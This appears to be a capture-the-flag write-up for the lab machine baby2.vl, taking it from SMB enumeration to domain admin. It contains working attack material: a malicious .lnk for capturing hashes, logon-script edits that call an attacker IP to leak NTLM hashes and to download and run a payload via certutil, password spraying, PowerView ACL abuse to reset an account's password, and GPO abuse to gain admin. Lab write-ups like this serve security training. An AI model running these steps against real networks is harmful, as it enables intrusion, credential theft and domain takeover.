



# Foothold


We see smb and we enum it


```
smbclient -L //baby2.vl/       
Password for [WORKGROUP\suljov]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	apps            Disk      
	C$              Disk      Default share
	docs            Disk      
	homes           Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to baby2.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```



home:
```
smbclient //baby2.vl/homes  
Password for [WORKGROUP\suljov]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep  2 16:45:25 2023
  ..                                  D        0  Tue Aug 22 22:10:21 2023
  Amelia.Griffiths                    D        0  Tue Aug 22 22:17:06 2023
  Carl.Moore                          D        0  Tue Aug 22 22:17:06 2023
  Harry.Shaw                          D        0  Tue Aug 22 22:17:06 2023
  Joan.Jennings                       D        0  Tue Aug 22 22:17:06 2023
  Joel.Hurst                          D        0  Tue Aug 22 22:17:06 2023
  Kieran.Mitchell                     D        0  Tue Aug 22 22:17:06 2023
  library                             D        0  Tue Aug 22 22:22:47 2023
  Lynda.Bailey                        D        0  Tue Aug 22 22:17:06 2023
  Mohammed.Harris                     D        0  Tue Aug 22 22:17:06 2023
  Nicola.Lamb                         D        0  Tue Aug 22 22:17:06 2023
  Ryan.Jenkins                        D        0  Tue Aug 22 22:17:06 2023

		6126847 blocks of size 4096. 1958910 blocks available
smb: \> 

```

tho nothing was in these folders. tho we have some usernames




apps:
```
smbclient //baby2.vl/apps                                                          
Password for [WORKGROUP\suljov]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep  7 21:12:59 2023
  ..                                  D        0  Tue Aug 22 22:10:21 2023
  dev                                 D        0  Thu Sep  7 21:13:50 2023

		6126847 blocks of size 4096. 1958200 blocks available
smb: \> cd dev\
smb: \dev\> ls
  .                                   D        0  Thu Sep  7 21:13:50 2023
  ..                                  D        0  Thu Sep  7 21:12:59 2023
  CHANGELOG                           A      108  Thu Sep  7 21:16:15 2023
  login.vbs.lnk                       A     1800  Thu Sep  7 21:13:23 2023

		6126847 blocks of size 4096. 1958200 blocks available
smb: \dev\> 

```


```
[0.2]

- Added automated drive mapping

[0.1]

- Rolled out initial version of the domain logon script
```


tho since there is also a .lnk file it might be that we are going to `phish`. using a malicius .lnk file we might get hash or two


creating malicius .lnk file



https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/


#### OBS the powershell script must be run in powershell in order to create the file (the file will be created in the C:\ folder)


in our Windows vm to create the .lnk file

malicius.lnk
```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
$lnk.TargetPath = "\\10.8.1.92\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```


then start responder or inveight and listen

we can put the file in every users folder in the smb share `homes` including the folder just before the users folder

now we wait.

it seems like it did not work :( 

BUUUUTT

after some testing i found that the user `Carl.Moore` and `library` has its own username as password

```
nxc smb baby2.vl -u usernames.txt -p usernames.txt --continue-on-success

SMB         10.10.106.166   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.10.106.166   445    DC               [+] baby2.vl\library:library 
SMB         10.10.106.166   445    DC               [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.

```

```
Carl.Moore:Carl.Moore
library:library
```

and he is also able to put the malicius .lnk fle in the dev folder in the smb share `apps` and also in the `docs` share just to be safe

but we get no hash so it is not that



but. we found that `Carl.Moore` can READ in the share `SYSVOL` but we also found out the user can upload file. we found the login.vbs script and edited to get a hash 

we added:
``` 
Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")
objShell.run "cmd /c copy \\10.8.1.92\pwn"
Set objShell = Nothing

```

in responder:
```
[SMB] NTLMv1-SSP Client   : 10.10.94.173
[SMB] NTLMv1-SSP Username : BABY2\Amelia.Griffiths
[SMB] NTLMv1-SSP Hash     : Amelia.Griffiths::BABY2:E97E1E1E22D3C83C97CEB1E5542389E126B797C45EA8E206:E97E1E1E22D3C83C97CEB1E5542389E126B797C45EA8E206:1122334455667788

```


since we cant crack it. we can try to make it execute a powershell script to get reverse shell

we wrote this in the `login.vbs` script 

```
Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")
objShell.run "cmd.exe /C ""certutil.exe -urlcache -f http://10.8.1.92:80/hej.exe C:\Users\Amelia.Griffiths\Desktop\hej.exe"" "
Set objShell = Nothing


Dim aa
Set objShell = WScript.CreateObject ("WScript.shell")
objShell.run "cmd.exe /C ""C:\Users\Amelia.Griffiths\Desktop\hej.exe"" "
Set aa = Nothing
```


and we got shell 

![[Pasted image 20240214221954.png]]




# Privesc


User flag
![[Pasted image 20240215175151.png]]


we use bloodhound to map the AD ENV. 

```
Sharphound.exe --CollectionMethods All --Domain baby2.vl 
```


we see our use has WriteDACL and Writeowner over the user `GPOADM`

![[Pasted image 20240217110225.png]]


grant user 'Amelia.Griffiths' the rights to change 'gpoadm's password using powerview. 
```
Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights ResetPassword -Verbose
```


![[Pasted image 20240217112358.png]]

we force change the password for the user `gpoadm`

```
$pass = ConvertTo-SecureString '!Albin970119' -AsPlainText -Force

set-domainuserpassword -identity gpoadm -accountpassword $pass 
```

![[Pasted image 20240217112801.png]]



now after looking around we see if we can use the GPO 


using: 
```
python3 pygpoabuse.py baby2.vl/gpoadm -gpo-id "6AC1786C-016F-11D2-945F-00C04FB984F9"
Password:
SUCCESS:root:ScheduledTask TASK_6fe96cfb created!
[+] ScheduledTask TASK_6fe96cfb created!

```


we update the GPO 

```
PS C:\users\Amelia.Griffiths\desktop> gpupdate /force
gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

```

and now we have a user in the administrators group



![[Pasted image 20240217130233.png]]

and we are basically admin

![[Pasted image 20240217130326.png]]

![[Pasted image 20240217130333.png]]


we dump hashes 

![[Pasted image 20240217130446.png]]


done 

![[Pasted image 20240217130532.png]]

